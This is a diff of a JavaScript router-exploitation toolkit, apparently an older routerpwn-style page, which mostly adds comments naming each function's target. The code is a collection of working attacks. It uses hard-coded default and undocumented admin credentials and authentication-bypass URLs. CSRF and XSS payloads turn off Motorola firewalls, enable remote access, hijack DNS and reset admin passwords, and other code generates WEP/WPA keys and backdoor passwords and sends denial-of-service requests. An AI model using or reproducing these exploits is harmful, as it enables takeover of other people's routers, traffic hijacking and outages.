@@ -1369,12 +1369,15 @@ function zyxelxsspr() {
 	}
 }
 
+// ZyXEL Prestige default password
 function zyxeldefault() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://user:1234@"+ip;
 	}
 }
+
+// Not used
 function shodan() {
 	q=prompt("Search:");
 	if (q==null || q==""){}else{
@@ -1382,6 +1385,7 @@ function shodan() {
 	}
 }
 
+// Not used
 function macfind() {
 	q=prompt("AP MAC:");
 	if (q==null || q==""){}else{
@@ -1389,69 +1393,84 @@ function macfind() {
 	}
 }
 
+// Siemens FlexiISN auth bypass AAA Configuration
 function isnaaa(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/cgi-bin/aaa.tcl?";
 	}
 }
+
+// Siemens FlexiISN auth bypass Aggregation Class Configuration
 function isnagr(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/cgi-bin/aggr_config.tcl?";
 	}
 }
+
+// Siemens FlexiISN auth bypass GGSN general Configuration
 function isnggs(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/opt/cgi-bin/ggsn/cgi.tcl?page=ggsnconf";
 	}
 }
+
+// Siemens FlexiISN auth bypass Network Access &amp; services
 function isnser(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/opt/cgi-bin/services.tcl?instance=default";
 	}
 }
+
+// Motorola SBG900 turn off firewall
 function motfirr(){
 	ip=prompt("IP:");
 	img1.src="http://"+ip+"/frames.asp?userId=admin&password=motorola";
 	alert("Continuar...");
 	img2.src="http://"+ip+"/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4";
 }
+function motfir(){
+	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
+	alert("Continue...");
+	img2.src='http://192.168.0.1/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4';
+}
+
+// Motorola SBG900 enable remote access
 function motremr(){
 	ip=prompt("IP:");
 	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
 	alert("Continuar...");
 	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
 }
+function motrem(){
+	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
+	alert("Continue...");
+	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
+}
+
+// Motorola SBG900 disable DHCP &amp; add custom DNS server
 function motdnsr(){
 	ip=prompt("IP:");
 	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
 	dns=prompt("DNS:");
 	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+dns+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
 }
+function motdns(){
+	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
+	ip=prompt("DNS:");
+	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+ip+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
+}
+
+// Motorola SBG900 change admin password
 function motpasr(){
 	ipp=prompt("IP:");
 	ip=prompt("New password:");
 	img1.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
 	alert("Continuar...");
 	img2.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+ip+"&Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
-}
-function motfir(){
-	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
-	alert("Continue...");
-	img2.src='http://192.168.0.1/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4';
-}
-function motrem(){
-	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
-	alert("Continue...");
-	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
-}
-function motdns(){
-	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
-	ip=prompt("DNS:");
-	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+ip+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
 }
 function motpas(){
 	ip=prompt("New password:");
@@ -1469,8 +1488,8 @@ function SBG6580_motorola(ip)
 	post('http://' + ip + '/goform/login', form);
 }
 
-
 function ruggedcom(){
+// RuggedCom "factory" Backdoor Password Generator
 // JC CREW April 23 2012 \n";
 // .js by hkm
   mac=prompt("MAC: ");
@@ -1518,6 +1537,7 @@ function acctongen(){
   }
   alert("PASSWORD: "+pass);
 }
+
 function mac2wepkey(){
 /* mac2wepkey Huawei HG520 by humberto121@websec.mx - 12/2010 */
 /* .js by hkm */
@@ -1593,18 +1613,21 @@ ye=(n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]
 
 alert("          WEP = "+key[ya]+key[yb]+key[yc]+key[yd]+key[ye]+"\n          SSID = "+ssid[s1]+ssid[s2]+ssid[s3]+ssid[s4]);
 }
+
 String.prototype.toHex = function() {
     return this.replace("com", function(s) {
         return "%"+parseInt(s.charCodeAt()).toString(16);
     });
 };
 
+// TRENDnet TEW 812DRU CSRF Enable remote telnet
 function trend23pwn(){
 document.t231.submit();
 setTimeout(function() {document.t232.submit();},3000);
 setTimeout(function() {document.t233.submit();},6000);
 }
 
+// Netgear DG632 'firmwarecfg' denial of service
 function netdos() {
 	ip=prompt("IP:");
 	document.netdos.action="http://"+ip+"/cgi-bin/firmwarecfg";
@@ -1612,6 +1635,8 @@ function netdos() {
 		document.netdos.submit();
 	}
 }
+
+// Netgear WNAP210 authentication bypass
 function netbyp(){
 	ip=prompt("IP:");
 	img1.src="http://"+ip+"/recreate.php";
@@ -1621,18 +1646,23 @@ function netbyp(){
 	}
 }
 
+// Netgear WG602 undocumented admin account (super)
 function netund() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://super:5777364@"+ip;
 	}
 }
+
+// Netgear WG602 undocumented admin account (superman)
 function netundb() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://superman:21241036@"+ip;
 	}
 }
+
+// Netgear FVS318 content filtering bypass
 function netcon() {
 	url=prompt("Full URL (without http):");
 	dominio=url.substr(0,url.indexOf("/"));
@@ -1641,6 +1671,8 @@ function netcon() {
 		document.location="http://"+dominio+path.toHex();
 	}
 }
+
+// Netear RP614v4 config disclosure
 function netconb() {
 	ip=prompt("IP:");
 	port=prompt("Port:");
@@ -1648,6 +1680,8 @@ function netconb() {
 		document.location="http://"+ip+"/vgn/jsp/netgear.cfg"+port;
 	}
 }
+
+// Netgear FVS318 log file arbitrary content injection
 function netlog() {
 	url=prompt("Blocked URL:");
 	code=prompt("Inject code:");
@@ -1673,6 +1707,7 @@ function ciscowlc_addadmin()
 
 }
 
+// Cisco Wireless Lan Controller WLC 7.2.110.0 - DOS
 function ciscowlc_dos()
 {
 	ip = prompt("IP: ")
@@ -1701,7 +1736,7 @@ function zyxel_660hwt1_v3_changessidpass(ip)
 
 }
 
-
+// Sagem Fast Telnet Root Password Generator
 function sagemtelnet(){
 
 	function mash(a,b){
@@ -1733,6 +1768,7 @@ function sagemtelnet(){
         alert("Telnet root password: "+password.join(""))
 }
 
+// Sagemcom f@st 3184 default wireless password [Cabovis&atilde;o]
 function sagemcable(){
 	ssid=prompt("SSID: ");
 	ssid=ssid.substring(3);
@@ -1745,7 +1781,7 @@ function sagemcable(){
         alert("Possible wireless keys: "+"\n"+password[0]+"\n"+password[1]+"\n"+password[2]+"\n"+password[3])
 }
 
-
+// EasyBox Standard WPA2 Key Generator
 function easyboxwpa(){
 	mac=prompt("MAC: ");
 	mac = mac.replace(/:/g, "");
@@ -1799,10 +1835,12 @@ function readConfig() {
 		xss('"><iframe src="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/config.xml" onload="alert(this.contentWindow.document.body.innerHTML);">');
 	}, 2000);
 }
+
 function xss(payload) { /* grax por el fix Alvaro Soto*/
 	ifrm = document.getElementById('iframe');
 	ifrm.contentWindow.location = 'http://192.168.1.1/cgi-bin/web.....9;'+payload;
 }
+
 function login() {
 	ip = ip | "192.168.1.1"
 	var f = document.createElement('form');
